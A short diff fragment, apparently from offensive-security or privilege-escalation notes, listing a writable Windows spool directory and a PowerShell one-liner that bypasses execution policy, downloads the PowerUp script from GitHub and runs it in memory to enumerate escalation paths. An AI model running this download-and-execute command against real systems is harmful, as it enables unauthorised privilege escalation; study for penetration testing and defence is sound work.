@@ -8,3 +8,5 @@ C:\windows\System32\spool\drivers\color
 
 # Download powerup and execute; in-mem
 powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks”
+
+#
